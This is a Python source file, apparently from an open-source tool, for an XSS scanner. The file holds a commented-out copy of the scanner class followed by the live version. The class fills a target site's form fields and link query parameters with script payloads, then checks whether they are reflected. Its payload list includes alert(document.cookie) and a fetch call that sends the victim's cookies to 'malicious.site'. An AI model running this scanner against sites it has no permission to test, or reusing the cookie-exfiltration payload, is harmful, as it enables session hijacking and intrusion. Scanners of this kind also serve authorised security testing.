# from lib.helper.helper import *
# from random import choice
# from bs4 import BeautifulSoup
# from urllib.parse import urljoin, urlparse, urlencode, parse_qs
# from lib.helper.Log import *
# from requests.packages.urllib3.exceptions import InsecureRequestWarning
# import requests
# import os

# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# class core:
    
#     @classmethod
#     def generate(cls, eff):
#         FUNCTION = [
#             "prompt(5000/200)",
#             "alert(6000/3000)",
#             "alert(document.cookie)",
#             "prompt(document.cookie)",
#             "console.log(5000/3000)",
#             "fetch('http://malicious.site?cookie=' + document.cookie)",
#             "document.body.innerHTML='<img src=x onerror=alert(1)>'"
#         ]
#         return f"<script>{choice(FUNCTION)}</script>"

#     @classmethod
#     def post_method(cls):
#         bsObj = BeautifulSoup(cls.body, "html.parser")
#         forms = bsObj.find_all("form", method=True)
        
#         for form in forms:
#             action = form.get("action", cls.url)  # Use .get() to avoid KeyError
#             if form["method"].lower().strip() == "post":
#                 Log.warning("Target has form with POST method: " + C + urljoin(cls.url, action))
#                 Log.info("Collecting form input keys...")
                
#                 keys = {}
#                 for key in form.find_all(["input", "textarea"]):
#                     name = key.get("name")
#                     if name:
#                         if key.get("type") == "submit":
#                             Log.info(f"Form key name: {G}{name}{N} value: {G}<Submit Confirm>")
#                             keys[name] = key["name"]
#                         else:
#                             Log.info(f"Form key name: {G}{name}{N} value: {G}{cls.payload}")
#                             keys[name] = cls.payload
                            
#                 Log.info("Sending payload (POST) method...")
#                 try:
#                     req = cls.session.post(urljoin(cls.url, action), data=keys, timeout=10)
#                     if cls.payload in req.text:
#                         Log.high("Detected XSS (POST) at " + urljoin(cls.url, req.url))
#                         cls.log_to_file(req.url, "POST data: ", keys)
#                     else:
#                         Log.info("Parameter page using (POST) payloads but not confirmed yet...")
#                 except requests.exceptions.RequestException as e:
#                     Log.high(f"Error during POST request: {str(e)}")

#     @classmethod
#     def get_method_form(cls):
#         bsObj = BeautifulSoup(cls.body, "html.parser")
#         forms = bsObj.find_all("form", method=True)
        
#         for form in forms:
#             action = form.get("action", cls.url)
#             if form["method"].lower().strip() == "get":
#                 Log.warning("Target has form with GET method: " + C + urljoin(cls.url, action))
#                 Log.info("Collecting form input keys...")
                
#                 keys = {}
#                 for key in form.find_all(["input", "textarea"]):
#                     name = key.get("name")
#                     if name:
#                         if key.get("type") == "submit":
#                             Log.info(f"Form key name: {G}{name}{N} value: {G}<Submit Confirm>")
#                             keys[name] = key["name"]
#                         else:
#                             Log.info(f"Form key name: {G}{name}{N} value: {G}{cls.payload}")
#                             keys[name] = cls.payload
                            
#                 Log.info("Sending payload (GET) method...")
#                 try:
#                     req = cls.session.get(urljoin(cls.url, action), params=keys, timeout=10)
#                     if cls.payload in req.text:
#                         Log.high("Detected XSS (GET) at " + urljoin(cls.url, req.url))
#                         cls.log_to_file(req.url, "GET data: ", keys)
#                     else:
#                         Log.info("\033[0;35;47m Parameter page using (GET) payloads but not confirmed yet...")
#                 except requests.exceptions.RequestException as e:
#                     Log.high(f"Error during GET request: {str(e)}")

#     @classmethod
#     def get_method(cls):
#         bsObj = BeautifulSoup(cls.body, "html.parser")
#         links = bsObj.find_all("a", href=True)
        
#         for a in links:
#             url = a["href"]
#             if url.startswith(("http://", "https://")):
#                 continue  # Ignore non-HTTP links
            
#             base = urljoin(cls.url, url)
#             query = urlparse(base).query
#             if query:
#                 Log.warning("Found link with query: " + G + query + N + " Maybe a potential XSS point")
                
#                 # Modify query parameters for testing
#                 query_payload = query.replace(query[query.find("=")+1:], cls.payload, 1)
#                 test = base.replace(query, query_payload, 1)
                
#                 query_all = base.replace(query, urlencode({x: cls.payload for x in parse_qs(query)}))
                
#                 Log.info("Testing query (GET): " + test)
#                 Log.info("Testing full query (GET): " + query_all)

#                 try:
#                     response = cls.session.get(test, verify=False, timeout=10)
#                     if cls.payload in response.text or cls.payload in cls.session.get(query_all).text:
#                         Log.high("Detected XSS (GET) at " + response.url)
#                         cls.log_to_file(response.url)
#                     else:
#                         Log.info("Parameter page using (GET) payloads but not confirmed yet...")
#                 except requests.exceptions.RequestException as e:
#                     Log.high(f"Error during GET request: {str(e)}")
#             else:
#                 Log.info("URL is not an HTTP URL, ignoring")

#     @classmethod
#     def log_to_file(cls, url, additional_info="", data=None):
#         with open("xss.txt", "a") as file:
#             file.write(f"URL: {url}\n")
#             if additional_info:
#                 file.write(additional_info + str(data) + "\n")
#             file.write("\n")

#     @classmethod
#     def main(cls, url, proxy, headers, payload, cookie, method=2):
#         print(W + "*"*15)
#         cls.payload = payload
#         cls.url = url
        
#         cls.session = session(proxy, headers, cookie)
#         Log.info("Checking connection to: " + Y + url)    
        
#         try:
#             ctr = cls.session.get(url, timeout=10)
#             cls.body = ctr.text
#         except requests.exceptions.RequestException as e:
#             Log.high("Connection error: " + str(e))
#             return
        
#         if ctr.status_code > 400:
#             Log.info("Connection failed " + G + str(ctr.status_code))
#             return 
#         else:
#             Log.info("Connection established " + G + str(ctr.status_code))
        
#         if method >= 2:
#             cls.post_method()
#             cls.get_method()
#             cls.get_method_form()
#         elif method == 1:
#             cls.post_method()
#         elif method == 0:
#             cls.get_method()
#             cls.get_method_form()


from lib.helper.helper import *
from random import choice
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from lib.helper.Log import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests
from random import randint
import os

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class core:
    
    @classmethod
    def generate(cls, eff):
        FUNCTION = [
            "prompt(5000/200)",
            "alert(6000/3000)",
            "alert(document.cookie)",
            "prompt(document.cookie)",
            "console.log(5000/3000)",
            "fetch('http://malicious.site?cookie=' + document.cookie)",
            "document.body.innerHTML='<img src=x onerror=alert(1)>'"
        ]
        if eff == 1:
            return "<script>" +FUNCTION[randint(0, 6)] + "</script>"
        elif eff == 2:
            return "<script>" +FUNCTION[randint(0, 6)] + "</script>"
        elif eff == 3:
            return "<script>" +FUNCTION[randint(0, 6)] + "</script>"
        elif eff == 4:
            return "<script>" +FUNCTION[randint(0, 6)] + "</script>"
        elif eff == 5:
            return "<script>" +FUNCTION[randint(0, 6)] + "</script>"
        elif eff == 6:
            return "<script>" +FUNCTION[randint(0, 6)] + "</script>"
        else:
            return "<script>console.log('Invalid effectiveness level');</script>"

    @classmethod
    def post_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        
        for form in forms:
            action = form.get("action", cls.url)  # Use .get() to avoid KeyError
            if form["method"].lower().strip() == "post":
                Log.warning("Target has form with POST method: " + C + urljoin(cls.url, action))
                Log.info("Collecting form input keys...")
                
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    name = key.get("name")
                    if name:
                        if key.get("type") == "submit":
                            Log.info(f"Form key name: {G}{name}{N} value: {G}<Submit Confirm>")
                            keys[name] = key["name"]
                        else:
                            Log.info(f"Form key name: {G}{name}{N} value: {G}{cls.payload}")
                            keys[name] = cls.payload
                            
                Log.info("Sending payload (POST) method...")
                try:
                    req = cls.session.post(urljoin(cls.url, action), data=keys, timeout=10)
                    if cls.payload in req.text:
                        Log.high("Detected XSS (POST) at " + urljoin(cls.url, req.url))
                        cls.log_to_file(req.url, "POST data: ", keys)
                    else:
                        Log.info("Parameter page using (POST) payloads but not confirmed yet...")
                except requests.exceptions.RequestException as e:
                    Log.high(f"Error during POST request: {str(e)}")

    @classmethod
    def get_method_form(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        
        for form in forms:
            action = form.get("action", cls.url)
            if form["method"].lower().strip() == "get":
                Log.warning("Target has form with GET method: " + C + urljoin(cls.url, action))
                Log.info("Collecting form input keys...")
                
                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    name = key.get("name")
                    if name:
                        if key.get("type") == "submit":
                            Log.info(f"Form key name: {G}{name}{N} value: {G}<Submit Confirm>")
                            keys[name] = key["name"]
                        else:
                            Log.info(f"Form key name: {G}{name}{N} value: {G}{cls.payload}")
                            keys[name] = cls.payload
                            
                Log.info("Sending payload (GET) method...")
                try:
                    req = cls.session.get(urljoin(cls.url, action), params=keys, timeout=10)
                    if cls.payload in req.text:
                        Log.high("Detected XSS (GET) at " + urljoin(cls.url, req.url))
                        cls.log_to_file(req.url, "GET data: ", keys)
                    else:
                        Log.info("\033[0;35;47m Parameter page using (GET) payloads but not confirmed yet...")
                except requests.exceptions.RequestException as e:
                    Log.high(f"Error during GET request: {str(e)}")

    @classmethod
    def get_method(cls):
        bsObj = BeautifulSoup(cls.body, "html.parser")
        links = bsObj.find_all("a", href=True)
        
        for a in links:
            url = a["href"]
            if url.startswith(("http://", "https://")):
                continue  # Ignore non-HTTP links
            
            base = urljoin(cls.url, url)
            query = urlparse(base).query
            if query:
                Log.warning("Found link with query: " + G + query + N + " Maybe a potential XSS point")
                
                # Modify query parameters for testing
                query_payload = query.replace(query[query.find("=")+1:], cls.payload, 1)
                test = base.replace(query, query_payload, 1)
                
                query_all = base.replace(query, urlencode({x: cls.payload for x in parse_qs(query)}))
                
                Log.info("Testing query (GET): " + test)
                Log.info("Testing full query (GET): " + query_all)

                try:
                    response = cls.session.get(test, verify=False, timeout=10)
                    if cls.payload in response.text or cls.payload in cls.session.get(query_all).text:
                        Log.high("Detected XSS (GET) at " + response.url)
                        cls.log_to_file(response.url)
                    else:
                        Log.info("Parameter page using (GET) payloads but not confirmed yet...")
                except requests.exceptions.RequestException as e:
                    Log.high(f"Error during GET request: {str(e)}")
            else:
                Log.info("URL is not an HTTP URL, ignoring")

    @classmethod
    def log_to_file(cls, url, additional_info="", data=None):
        with open("xss.txt", "a") as file:
            file.write(f"URL: {url}\n")
            if additional_info:
                file.write(additional_info + str(data) + "\n")
            file.write("\n")

    @classmethod
    def main(cls, url, proxy, headers, payload, cookie, method=2):
        print(W + "*"*15)
        cls.payload = payload
        cls.url = url
        
        cls.session = session(proxy, headers, cookie)
        Log.info("Checking connection to: " + Y + url)    
        
        try:
            ctr = cls.session.get(url, timeout=10)
            cls.body = ctr.text
        except requests.exceptions.RequestException as e:
            Log.high("Connection error: " + str(e))
            return
        
        if ctr.status_code > 400:
            Log.info("Connection failed " + G + str(ctr.status_code))
            return 
        else:
            Log.info("Connection established " + G + str(ctr.status_code))
        
        if method >= 2:
            cls.post_method()
            cls.get_method()
            cls.get_method_form()
        elif method == 1:
            cls.post_method()
        elif method == 0:
            cls.get_method()
            cls.get_method_form()


